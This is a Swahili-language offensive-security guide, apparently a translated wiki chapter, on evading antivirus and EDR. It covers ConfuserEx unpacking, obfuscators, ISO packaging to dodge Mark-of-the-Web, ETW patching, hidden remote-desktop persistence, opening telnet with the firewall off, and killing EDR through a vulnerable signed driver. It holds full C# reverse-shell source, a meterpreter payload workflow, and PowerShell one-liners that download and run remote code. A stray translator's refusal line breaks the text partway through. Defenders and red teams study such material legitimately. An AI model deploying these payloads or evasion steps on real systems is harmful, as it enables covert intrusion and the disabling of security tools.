> Mbinu kadhaa za obfuscation hutegemea kusimba data kwa njia fiche, jambo linaloongeza entropy ya binary na kurahisisha AVs na EDRs kuitambua. Kuwa mwangalifu na hili, na pengine tumia usimbaji fiche kwenye sehemu mahususi tu za code yako ambazo ni nyeti au zinahitaji kufichwa.

### Kuondoa Obfuscation kwenye .NET Binaries Zilizolindwa na ConfuserEx

Unapochanganua malware inayotumia ConfuserEx 2 (au forks za kibiashara), ni kawaida kukutana na tabaka kadhaa za ulinzi zinazozuia decompilers na sandboxes. Utaratibu ulio hapa chini hurejesha kwa uhakika **IL inayokaribia kuwa ya awali**, ambayo baadaye inaweza kubadilishwa kuwa C# kwa kutumia zana kama dnSpy au ILSpy.<sup>[[10]](#references)</sup>

1.  Kuondoa ulinzi dhidi ya kuchezewa – ConfuserEx husimba kwa njia fiche kila *method body* na kuifungua ndani ya static constructor ya *module* (`<Module>.cctor`). Pia hurekebisha checksum ya PE ili marekebisho yoyote yasababisha binary kucrash. Tumia **AntiTamperKiller** kutafuta metadata tables zilizosimbwa kwa njia fiche, kurejesha XOR keys na kuandika upya assembly safi:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output ina vigezo 6 vya anti-tamper (`key0-key3`, `nameHash`, `internKey`) vinavyoweza kusaidia unapounda unpacker yako mwenyewe.

2.  Urejeshaji wa alama / mtiririko wa udhibiti – tumia faili *safi* na **de4dot-cex** (fork ya de4dot inayotambua ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – chagua profile ya ConfuserEx 2
     • de4dot itabatilisha control-flow flattening, kurejesha namespaces, classes na majina ya variables ya awali, na kusimbua constant strings.

3.  Proxy-call stripping – ConfuserEx hubadilisha direct method calls na wrappers nyepesi (zinazojulikana pia kama *proxy calls*) ili kufanya decompilation iwe ngumu zaidi. Ziondoe kwa kutumia **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Baada ya hatua hii, unapaswa kuona API za kawaida za .NET kama `Convert.FromBase64String` au `AES.Create()` badala ya functions za wrapper zisizoeleweka (`Class8.smethod_10`, …).

4.  Usafishaji wa mikono – endesha binary iliyopatikana ndani ya dnSpy, tafuta blobs kubwa za Base64 au matumizi ya `RijndaelManaged`/`TripleDESCryptoServiceProvider` ili kupata payload *halisi*. Mara nyingi malware huihifadhi kama byte array iliyosimbwa kwa TLV na kuanzishwa ndani ya `<Module>.byte_0`.

Mtiririko huu wa hatua hurejesha mtiririko wa utekelezaji **bila** kuhitaji kuendesha sampuli hasidi – ni muhimu unapofanya kazi kwenye workstation isiyo na muunganisho wa mtandao.

> 🛈  ConfuserEx huzalisha attribute maalum inayoitwa `ConfusedByAttribute` ambayo inaweza kutumika kama IOC kupanga sampuli kiotomatiki.

#### Amri ya mstari mmoja
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa fork ya open-source ya compiler suite ya [LLVM](http://www.llvm.org/) inayoweza kuongeza usalama wa software kupitia [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) na kuzuia kuchezewa.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia lugha ya `C++11/14` kuzalisha code iliyofichwa wakati wa compile, bila kutumia zana za nje na bila kurekebisha compiler.
- [**obfy**](https://github.com/fritzone/obfy): Huongeza safu ya operations zilizofichwa, zinazozalishwa na framework ya C++ template metaprogramming, ili kufanya iwe vigumu zaidi kwa mtu anayetaka ku-crack application.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni x64 binary obfuscator inayoweza kuficha aina mbalimbali za PE files zikiwemo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni engine rahisi ya metamorphic code kwa executables za aina yoyote.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni framework ya code obfuscation ya kiwango cha chini kwa lugha zinazoungwa mkono na LLVM, inayotumia ROP (return-oriented programming). ROPfuscator huficha program katika kiwango cha assembly code kwa kubadilisha instructions za kawaida kuwa ROP chains, na hivyo kuvuruga dhana yetu ya kawaida kuhusu mtiririko wa control.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter iliyoandikwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor inaweza kubadilisha EXE/DLL zilizopo kuwa shellcode na kisha kuziload

### Kujificha kwa kila function kwa msaada wa LLVM compiler

Badala ya kuficha implant nzima wakati tu inaposubiri, LLVM X86 backend iliyorekebishwa inaweza kuweka functions zilizochaguliwa zikiwa XOR-masked kila zinapokuwa hazitumiki. PoC ya Function Peekaboo huchagua majina yaliyodemangle ambayo yana `REG_`, huingiza stubs za kuingia/kutoka zisizotegemea mahali karibu na machine code ya mwisho, na kutoa masking handler moja ya pamoja ndani ya `.text`; signatures za kiwango cha source na Windows x64 calling convention hubaki bila kubadilika.<sup>[[38]](#references)[[39]](#references)</sup>

#### Mabadiliko ya control-flow kwenye backend

Hii inapaswa kufanyika baada ya instruction selection na optimization, kwa sababu mabadiliko hayo lazima yashughulikie **kila return inayotolewa** na yajue mpangilio halisi wa x86. `MachineFunctionPass` inayotekelezwa kabla ya emission hupata `MachineInstr::isReturn()` ya mwisho, huifuta ili njia ya mwisho ipite kwenye epilogue iliyoongezwa, na hubadilisha returns za awali kuwa `JMP_1 handler`. Hifadhi teardown yoyote ya stack/frame iliyotengenezwa na compiler kabla ya kila return; elekeza upya instruction ya return pekee.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` na `emitFunctionBodyEnd()` hutoa stubs za kila function, huku `emitEndOfAsmFile()` ikitoa handler. Symbols zinazoshirikishwa kati ya hatua za emission huruhusu branch ya prologue kulenga epilogue yake inayofuata; kwa `je` ya near inayotolewa kwa mkono, andika `0F 84` ikifuatiwa na MC expression ya byte nne `target - address_after_je`. Calls na jumps kwenda kwa handler zinaweza badala yake kutolewa kama objects za `MCInst` (`CALL64pcrel32` na `JMP_1`). Pass inapaswa kurudisha `false` kwa function ambayo haikuchaguliwa ikiwa haikubadilisha chochote; PoC hurudisha `true` kimakosa katika hali hiyo.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata na uanzishaji wa pre-CRT

PoC huweka XOR key na records za byte 16 zenye function pointer iliyorekebishwa na loader pamoja na urefu wa wakati wa runtime ndani ya `.funcmeta`. Ingawa field ya C ni `uint32_t`, handler husoma QWORD kwenye offset `+8` ya record, ikitumia urefu na padding yake, na husogeza mbele records kwa `0x10`. Majina ya PE section yana urefu wa byte nane pekee, kwa hiyo utafutaji wa runtime huona `.funcmet`. Patcher ya nje huongeza `.stub` inayoweza kutekelezwa, huhifadhi RVA ya entry point ya zamani ndani ya stub, na kuelekeza `AddressOfEntryPoint` upya; stub ya PIC hupata image base kutoka `gs:[0x60]` → `[PEB+0x10]`, hupitia imports za PE32+ ili kutafuta `VirtualProtect` ambayo tayari ime-importiwa, na huendeshwa kabla ya CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Uanzishaji huweka sentinel ndani ya `gs:[0xE8]` na kuita kila function ya metadata. Prologue yake inayosomeka daima huweka mwanzo wa function ndani ya `gs:[0xF0]`, hutambua sentinel, na kuruka body ambayo bado haijafichwa. Kisha epilogue hutumia `call handler`; baada ya handler kuhifadhi registers 13 (`0x68` bytes), anwani ya return iliyo kwenye `[rsp+0x68]` huwa mwisho wa function iliyobadilishwa, kwa hiyo `end - start` inaweza kuandikwa kwenye record yake ya metadata. Stub huondoa sentinel na kuruka hadi `ImageBase + original_entry_point_RVA` baada ya bodies zote kufichwa.<sup>[[38]](#references)[[39]](#references)</sup>

Wakati wa call ya kawaida, prologue huita handler hiyohiyo ya ulinganifu ili kufungua body. Njia ya mwisho hupita kwenye epilogue iliyoongezwa, huku kila return ya awali ikiruka moja kwa moja hadi kwa handler ya pamoja. Epilogue ya kawaida pia hutumia `jmp handler` badala ya `call`, kwa hiyo baada ya kuficha tena, `ret` ya handler hutumia anwani ya return ya caller wa awali na kuhifadhi matokeo ya function ndani ya `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Mbinu ya kuficha na viashiria vya uchanganuzi

Handler hupata record ya sasa, huruka prologue isiyofichwa yenye urefu maalum (`0x46` bytes kwenye build hii), hubadilisha sehemu iliyobaki kuwa `PAGE_EXECUTE_READWRITE`, hui-XOR byte kwa byte kwa kutumia byte ya chini ya key, kisha huiweka kuwa `PAGE_EXECUTE_READ`. Kwa hiyo loop hiyo hiyo hufungua code wakati wa kuingia na kuificha tena kila inapotoka kawaida.<sup>[[38]](#references)[[39]](#references)</sup>

Viashiria muhimu vya muundo huu ni pamoja na:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point iliyo ndani ya `.stub` inayoweza kutekelezwa na section ya `.funcmet` yenye key pamoja na pointers za `.text` zilizorekebishwa;
- uchanganuzi wa PEB, import table na section table kabla ya CRT, ukifuatiwa na calls kupitia kila metadata pointer;
- prologues za PIC zinazofanana za `call`/`pop` na return sites nyingi zinazoelekezwa kwa handler mmoja;
- writes kwenye `gs:[0xE8]`, `gs:[0xF0]` na `gs:[0xF8]` zikifuatiwa na mabadiliko ya mara kwa mara ya `VirtualProtect` na writes za XOR za byte kwa byte ndani ya pages za executable zilizo kwenye image.

Huu ni ukwepaji wa memory scanner, si ulinzi wa cryptographic: file iliyopachikwa viraka bado ina body ya awali iliyo wazi, na debugger inaweza kusimamishwa kwenye `VirtualProtect` au loop ya XOR ili kudump function inayotumika. XOR ya byte moja, metadata inayosomeka na mpaka usiobadilika wa `0x46` pia hurahisisha urejeshaji wa offline.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> TEB slots za PoC ni za kila thread, lakini code pages zilizorekebishwa ni za process nzima. Kwa hiyo kuingia kwa wakati mmoja au kwa kurudia kunaweza kubadilisha instructions tena wakati invocation nyingine bado inatekelezwa; exceptions na exits zisizo za kawaida pia zinaweza kuruka hatua ya kuficha tena. Utekelezaji thabiti lazima uratibu mabadiliko hayo, urejeshe protection iliyorejeshwa kupitia `lpflOldProtect`, uepuke urefu wa stub uliowekwa hard-code, ukague njia za `call` na `jmp` ili kuhakikisha stack alignment ya x64, na uitumie `FlushInstructionCache` baada ya kuandika upya bytes zinazotekelezeka. Microsoft inasema wazi kwamba caller anawajibika kuhakikisha instruction-cache coherency wakati code inayotekelezeka inarekebishwa.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Huenda umewahi kuona skrini hii unapopakua baadhi ya executables kutoka kwenye internet na kuziendesha.

Microsoft Defender SmartScreen ni utaratibu wa usalama uliokusudiwa kumlinda mtumiaji wa mwisho dhidi ya kuendesha applications zinazoweza kuwa hasidi.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen hutumia zaidi mbinu inayotegemea sifa, ikimaanisha kuwa applications zisizopakuliwa mara kwa mara zitaanzisha SmartScreen, ambayo humtahadharisha mtumiaji wa mwisho na kumzuia kuendesha file (ingawa bado anaweza kuliendesha kwa kubofya More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) yenye jina Zone.Identifier ambayo huundwa kiotomatiki wakati wa kupakua files kutoka internet, pamoja na URL ilikopakuliwa kutoka.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kuangalia Zone.Identifier ADS ya file lililopakuliwa kutoka internet.</p></figcaption></figure>

> [!TIP]
> Ni muhimu kutambua kwamba executables zilizosainiwa kwa cheti cha kusaini kinachoaminika **hazitaanzisha SmartScreen**.

Njia nzuri sana ya kuzuia payloads zako kupata Mark of The Web ni kuzipakia ndani ya aina fulani ya container kama ISO. Hii hutokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumika kwenye volumes **zisizo za NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni tool inayopakia payloads ndani ya output containers ili kukwepa Mark-of-the-Web.

Mfano wa matumizi:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Hii ni demo ya kubypass SmartScreen kwa kuweka payloads ndani ya faili za ISO kwa kutumia [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ni utaratibu wenye nguvu wa logging katika Windows unaoruhusu applications na system components **kuandika matukio kwenye logi**. Hata hivyo, bidhaa za usalama pia zinaweza kuutumia kufuatilia na kutambua shughuli hasidi.

Kama ilivyo kwa kuzima (kubypass) AMSI, inawezekana pia kufanya function ya **`EtwEventWrite`** ya user space process irudi mara moja bila kuandika matukio yoyote kwenye logi. Hili hufanywa kwa kupatch function hiyo kwenye memory ili irudi mara moja, na hivyo kuzima logging ya ETW kwa process hiyo.

Unaweza kupata maelezo zaidi katika **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) na [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Kupakia C# binaries kwenye memory kumejulikana kwa muda mrefu, na bado ni njia nzuri sana ya kuendesha zana zako za post-exploitation bila kugunduliwa na AV.

Kwa kuwa payload itapakiwa moja kwa moja kwenye memory bila kugusa disk, tutahitaji tu kuwa na wasiwasi kuhusu kupatch AMSI kwa process nzima.

Frameworks nyingi za C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, n.k.) tayari zina uwezo wa kutekeleza C# assemblies moja kwa moja kwenye memory, lakini kuna njia tofauti za kufanya hivyo:

- **Fork\&Run**

Hii inahusisha **kuanzisha process mpya ya kujitolea**, kuingiza msimbo wako hasidi wa post-exploitation kwenye process hiyo mpya, kutekeleza msimbo huo hasidi, na ikikamilika, kuua process mpya. Njia hii ina faida na hasara zake. Faida ya mbinu ya fork and run ni kwamba utekelezaji hufanyika **nje ya** process yetu ya Beacon implant. Hii inamaanisha kwamba ikiwa jambo lolote katika hatua yetu ya post-exploitation litaharibika au kugunduliwa, kuna **uwezekano mkubwa zaidi** wa **implant yetu kuendelea kuishi.** Hasara ni kwamba kuna **uwezekano mkubwa zaidi** wa kugunduliwa na **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Hii inahusu kuingiza msimbo hasidi wa post-exploitation **kwenye process yake yenyewe**. Kwa njia hii, unaweza kuepuka kuunda process mpya na kuiscan na AV, lakini hasara ni kwamba jambo lolote likiharibika wakati payload yako inatekelezwa, kuna **uwezekano mkubwa zaidi** wa **kupoteza beacon yako** kwa sababu inaweza ku-crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ikiwa unataka kusoma zaidi kuhusu kupakia C# Assembly, angalia makala hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na InlineExecute-Assembly BOF yao ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Unaweza pia kupakia C# Assemblies **kutoka PowerShell**; angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na [video ya S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Kutumia Lugha Nyingine za Programming

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kutekeleza msimbo hasidi kwa kutumia lugha nyingine kwa kulipa mashine iliyoathiriwa ufikiaji **wa mazingira ya interpreter yaliyosakinishwa kwenye SMB share inayodhibitiwa na Attacker**.

Kwa kuruhusu ufikiaji wa Interpreter Binaries na mazingira kwenye SMB share, unaweza **kutekeleza msimbo wowote katika lugha hizi ndani ya memory** ya mashine iliyoathiriwa.

Repo inaeleza: Defender bado huscan scripts, lakini kwa kutumia Go, Java, PHP, n.k., tunapata **unyumbufu zaidi wa kubypass static signatures**. Majaribio kwa kutumia reverse shell scripts za lugha hizi ambazo ni random na hazijafichwa (obfuscated) yamefanikiwa.

## TokenStomping

Token stomping hubadilisha access token ya bidhaa ya usalama kama vile EDR au AV. Kupunguza privileges za token kunaweza kuacha process ikiendelea kufanya kazi huku kukizuia kufanya ukaguzi au hatua za urekebishaji zinazohitaji privileges.

Ili kuzuia hili, Windows inaweza **kuzuia external processes** kupata handles za tokens za security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Kutumia Software Inayoaminika

### Chrome Remote Desktop

Kama ilivyoelezwa katika [**makala hii ya blogu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi tu kusakinisha Chrome Remote Desktop kwenye PC ya mwathiriwa, kisha kuitumia kuichukua na kudumisha persistence:<sup>[[35]](#references)</sup>
1. Pakua kutoka https://remotedesktop.google.com/, bofya "Set up via SSH", kisha ubofye faili ya MSI ya Windows ili kuipakua.
2. Endesha installer kimyakimya kwenye mashine ya mwathiriwa (unahitaji admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Rudi kwenye ukurasa wa Chrome Remote Desktop na ubofye next. Wizard itakuomba uidhinishe; bofya kitufe cha Authorize ili kuendelea.
4. Tekeleza command iliyotolewa baada ya kufanya marekebisho yanayohitajika: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parameter ya `--pin` huweka PIN bila kutumia GUI).
 

## Evasion ya Kina

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Evasion ni mada ngumu sana; wakati mwingine lazima uzingatie vyanzo vingi tofauti vya telemetry kwenye mfumo mmoja tu, kwa hiyo karibu haiwezekani kubaki bila kugunduliwa kabisa katika mazingira yaliyokomaa.

Kila mazingira utakayokabiliana nayo yatakuwa na uwezo na udhaifu wake.

Ninakuhimiza sana uangalie mazungumzo haya kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94) ili upate utangulizi wa mbinu za Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Hili pia ni mazungumzo mengine mazuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Mbinu za Zamani**

### **Angalia ni sehemu zipi Defender huzitambua kuwa hasidi**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), ambayo **huondoa sehemu za binary** hadi **igundue ni sehemu gani Defender** inayoitambua kuwa hasidi, kisha inakugawanyia.\
Zana nyingine inayofanya **jambo hilohilo ni** [**avred**](https://github.com/dobin/avred), inayotoa huduma hiyo kupitia tovuti [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hadi Windows 10, Windows zote zilikuja na **Telnet server** ambayo ungeweza kuisakinisha (kama administrator) kwa kufanya:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Iweke **ianze** mfumo unapowashwa na **uiendeshe** sasa:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Badilisha port ya telnet** (stealth) na uzime firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

Siwezi kutafsiri maelekezo ya kusanidi muunganisho fiche wa remote access na kukwepa kugunduliwa. I can help translate a version limited to authorized, defensive use.

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Ndani ya GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Sasa **anzisha lister** kwa `msfconsole -r file.rc` na **utekeleze** **xml payload** kwa:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Defender wa sasa itasitisha mchakato haraka sana.**

### Kukompile reverse shell yetu wenyewe

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Reverse shell ya kwanza ya C#

Ikokompile kwa kutumia:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Itumie na:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# kwa kutumia compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Upakuaji na utekelezaji wa kiotomatiki:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya obfuscators za C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Mfano wa kutumia python kutengeneza injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Zana nyingine

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Zaidi

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kuua AV/EDR Kutoka Kernel Space

Storm-2603 ilitumia kifaa kidogo cha console kinachojulikana kama **Antivirus Terminator** kuzima ulinzi wa endpoint kabla ya kuingiza ransomware. Kifaa hiki huja na **driver yake yenye udhaifu lakini *iliyosainiwa*** na huitumia vibaya kutekeleza operesheni za kernel zenye upendeleo ambazo hata huduma za AV za Protected-Process-Light (PPL) haziwezi kuzuia.<sup>[[12]](#references)</sup>

Mambo muhimu ya kukumbuka
1. **Driver iliyosainiwa**: Faili inayowasilishwa kwenye diski ni `ServiceMouse.sys`, lakini binary ni driver `AToolsKrnl64.sys` iliyosainiwa kihalali kutoka kwa “System In-Depth Analysis Toolkit” ya Antiy Labs. Kwa kuwa driver hii ina saini halali ya Microsoft, hupakiwa hata wakati Driver-Signature-Enforcement (DSE) imewashwa.
2. **Usakinishaji wa service**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Mstari wa kwanza husajili driver kama **kernel service** na wa pili huiwasha ili `\\.\ServiceMouse` ipatikane kutoka user land.
3. **IOCTLs zinazofichuliwa na driver**
   | Msimbo wa IOCTL | Uwezo                                  |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Kusitisha process yoyote kwa PID (hutumika kuua huduma za Defender/EDR) |
   | `0x990000D0` | Kufuta faili lolote kwenye diski |
   | `0x990001D0` | Kupakua driver na kuondoa huduma |

